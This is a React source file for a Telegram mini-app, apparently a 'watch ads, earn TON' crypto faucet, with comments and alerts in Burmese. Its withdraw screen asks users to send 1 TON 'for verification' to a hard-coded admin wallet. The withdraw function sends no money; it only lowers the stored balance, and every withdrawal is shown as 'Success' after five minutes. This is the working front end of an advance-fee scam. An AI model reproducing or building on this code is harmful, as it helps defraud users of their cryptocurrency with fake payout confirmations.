import React, { useState, useEffect, useCallback } from 'react';

const tg = window.Telegram?.WebApp;

const APP_CONFIG = {
  ADMIN_WALLET: "UQDasFrJo7PrMaJcRFivcBVVnhWNQxYG-y32EN0ZeQPRSOp9", //
  MY_UID: tg?.initDataUnsafe?.user?.id?.toString() || "1793453606", 
  ADSGRAM_BLOCK_ID: "27611", 
  FIREBASE_URL: "https://easytonfree-default-rtdb.firebaseio.com",
  SUPPORT_BOT: "https://t.me/EasyTonHelp_Bot",
  MIN_WITHDRAW: 0.1,
  WATCH_REWARD: 0.0009, //
  VIP_WATCH_REWARD: 0.003, //
  REFER_REWARD: 0.001
};

function App() {
  const [balance, setBalance] = useState(() => Number(localStorage.getItem('ton_bal')) || 0.0000);
  const [isVip, setIsVip] = useState(false);
  const [completed, setCompleted] = useState(() => JSON.parse(localStorage.getItem('comp_tasks')) || []);
  const [withdrawHistory, setWithdrawHistory] = useState(() => JSON.parse(localStorage.getItem('wd_hist')) || []);
  const [referrals, setReferrals] = useState(() => JSON.parse(localStorage.getItem('refs')) || []);
  const [activeNav, setActiveNav] = useState('earn');
  const [activeTab, setActiveTab] = useState('bot');
  
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');

  // ၅ မိနစ်ပြည့်ရင် Success ပြပေးရန် Logic
  const getStatus = (timestamp) => {
    const fiveMinutes = 5 * 60 * 1000;
    return (Date.now() - timestamp > fiveMinutes) ? "Success" : "Pending";
  };

  useEffect(() => {
    localStorage.setItem('ton_bal', balance.toString());
    localStorage.setItem('comp_tasks', JSON.stringify(completed));
    localStorage.setItem('wd_hist', JSON.stringify(withdrawHistory));
    localStorage.setItem('refs', JSON.stringify(referrals));
  }, [balance, completed, withdrawHistory, referrals]);

  // Firebase Sync
  const updateFirebase = (data) => {
    fetch(`${APP_CONFIG.FIREBASE_URL}/users/${APP_CONFIG.MY_UID}.json`, {
      method: 'PATCH',
      body: JSON.stringify(data)
    });
  };

  const handleWithdraw = () => {
    const amt = Number(withdrawAmount);
    if (!withdrawAddress || amt < APP_CONFIG.MIN_WITHDRAW) {
      return alert(`အနည်းဆုံး ${APP_CONFIG.MIN_WITHDRAW} TON ထုတ်ပေးပါဗျ`);
    }
    if (amt > balance) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ");

    const newEntry = {
      amount: amt,
      address: withdrawAddress,
      timestamp: Date.now(),
      date: new Date().toLocaleString()
    };

    const newBal = Number((balance - amt).toFixed(5)); // Auto Balance Deduction
    const newHistory = [newEntry, ...withdrawHistory];

    setBalance(newBal);
    setWithdrawHistory(newHistory);
    updateFirebase({ balance: newBal, withdrawHistory: newHistory });

    alert("ငွေထုတ်ယူမှု တင်ပြပြီးပါပြီ။ ၅ မိနစ်အတွင်း အတည်ပြုပေးပါမည်။");
    setWithdrawAmount(''); setWithdrawAddress('');
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    alert("Copied!");
  };

  const styles = {
    main: { backgroundColor: '#facc15', minHeight: '100vh', padding: '15px', paddingBottom: '110px' },
    header: { textAlign: 'center', background: '#000', padding: '25px', borderRadius: '25px', color: '#fff', border: '3px solid #fff', marginBottom: '15px' },
    card: { backgroundColor: '#fff', padding: '15px', borderRadius: '15px', marginBottom: '10px', border: '2px solid #000', boxShadow: '4px 4px 0px #000' },
    btn: { width: '100%', padding: '12px', backgroundColor: '#000', color: '#fff', border: 'none', borderRadius: '10px', fontWeight: 'bold' },
    input: { width: '100%', padding: '12px', marginBottom: '10px', borderRadius: '10px', border: '1px solid #000' },
    nav: { position: 'fixed', bottom: 0, left: 0, right: 0, display: 'flex', backgroundColor: '#000', padding: '15px', borderTop: '3px solid #fff' }
  };

  return (
    <div style={styles.main}>
      <div style={styles.header}>
        <small style={{color: '#facc15'}}>TOTAL BALANCE</small>
        <h1 style={{fontSize: '38px'}}>{balance.toFixed(5)} TON</h1>
      </div>

      {activeNav === 'withdraw' && (
        <>
          <div style={styles.card}>
            <h3 style={{color: '#ef4444'}}>⚠️ Pay 1 TON for Verification</h3>
            <div style={{fontSize: '12px', marginBottom: '10px'}}>
              Wallet: <b>{APP_CONFIG.ADMIN_WALLET}</b>
              <button style={{...styles.btn, height: '30px', padding: '0', marginTop: '5px'}} onClick={() => copyToClipboard(APP_CONFIG.ADMIN_WALLET)}>COPY WALLET</button>
            </div>
            <div style={{fontSize: '12px', marginBottom: '10px'}}>
              Memo: <b>{APP_CONFIG.MY_UID}</b>
              <button style={{...styles.btn, height: '30px', padding: '0', marginTop: '5px'}} onClick={() => copyToClipboard(APP_CONFIG.MY_UID)}>COPY MEMO</button>
            </div>
          </div>

          <div style={styles.card}>
            <h3>Withdraw</h3>
            <input style={styles.input} placeholder="TON Amount" type="number" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} />
            <input style={styles.input} placeholder="Your Wallet Address" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} />
            <button style={{...styles.btn, background: '#3b82f6'}} onClick={handleWithdraw}>WITHDRAW</button>
          </div>

          <div style={styles.card}>
            <h3>History</h3>
            <div style={{maxHeight: '200px', overflowY: 'auto'}}>
              {withdrawHistory.map((h, i) => (
                <div key={i} style={{fontSize: '11px', padding: '10px 0', borderBottom: '1px solid #eee'}}>
                  <div>Date: {h.date}</div>
                  <div>Amount: {h.amount} TON | Status: <b style={{color: getStatus(h.timestamp) === 'Success' ? 'green' : 'orange'}}>{getStatus(h.timestamp)}</b></div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      {activeNav === 'profile' && (
        <div style={styles.card}>
          <h3>User Profile</h3>
          <div style={{padding: '10px 0', borderBottom: '1px solid #eee'}}>Status: <b>{isVip ? "VIP ⭐" : "ACTIVE ✅"}</b></div>
          <div style={{padding: '10px 0', borderBottom: '1px solid #eee'}}>User ID: <b>{APP_CONFIG.MY_UID}</b></div>
          <div style={{padding: '10px 0', borderBottom: '1px solid #eee'}}>Balance: <b>{balance.toFixed(5)} TON</b></div>
          <button style={{...styles.btn, background: '#ef4444', marginTop: '20px'}} onClick={() => window.open(APP_CONFIG.SUPPORT_BOT)}>SUPPORT</button>
        </div>
      )}

      {/* Navigation and other components */}
      <div style={styles.nav}>
        {['earn', 'invite', 'withdraw', 'profile'].map(n => (
          <button key={n} onClick={() => setActiveNav(n)} style={{ flex: 1, background: 'none', border: 'none', color: activeNav === n ? '#facc15' : '#fff', fontWeight: 'bold' }}>
            {n.toUpperCase()}
          </button>
        ))}
      </div>
    </div>
  );
}

export default App;
